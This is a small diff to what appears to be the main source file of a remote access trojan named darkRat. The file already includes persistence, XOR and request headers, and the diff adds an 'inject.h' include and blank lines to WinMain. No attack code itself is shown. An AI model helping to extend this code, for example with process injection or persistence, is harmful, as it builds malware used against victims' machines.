@@ -24,6 +24,7 @@
 #include "DarkRequest.h"
 #include "XOR.h"
 #include "spiderrun.h"
+#include "inject.h"
 #include "Client.h"
 #include "persistenceLayer.h"
 #include <signal.h>
@@ -45,6 +46,11 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
 		int iCmdShow){
 #endif
+
+
+
+
+
 
 		darkRat::config::config config = darkRat::config::load();
 		//Config config;
